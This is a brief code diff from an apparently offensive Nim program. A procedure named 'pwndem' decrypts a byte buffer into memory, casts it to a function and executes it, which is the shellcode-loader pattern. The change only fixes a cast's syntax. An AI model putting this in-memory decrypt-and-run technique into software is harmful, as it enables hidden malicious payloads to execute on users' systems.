@@ -171,7 +171,7 @@ proc pwndem[byte](friendlycode: openarray[byte]): void =
         ptrDecText = cast[ptr byte](buffer)
         decryptlate()
         #decryptLate()
-        let f = cast[proc(){.nimcall.}](buffer): void
+        let f = cast[proc(){.nimcall.}](buffer)
         f()
         Wait()
 
